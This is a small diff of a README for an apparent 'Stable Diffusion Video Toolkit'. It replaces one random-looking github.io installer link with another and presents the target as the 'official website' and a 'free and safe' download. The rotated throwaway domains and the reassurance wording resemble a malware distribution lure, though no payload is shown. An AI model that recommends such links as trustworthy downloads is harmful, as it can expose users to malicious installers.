@@ -45,7 +45,7 @@ A5: The application includes an auto-update feature that checks for new versions
 
 To get started with the Stable Diffusion Video Toolkit, click the link below to download the installer. The download is free and safe, providing you with access to all features without any restrictions.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 For additional resources, including documentation, model packs, and community support, visit our GitHub repository. We encourage users to contribute to the project by reporting issues, suggesting features, or sharing their video creations. Together, we can enhance the capabilities of AI-driven video generation.
 
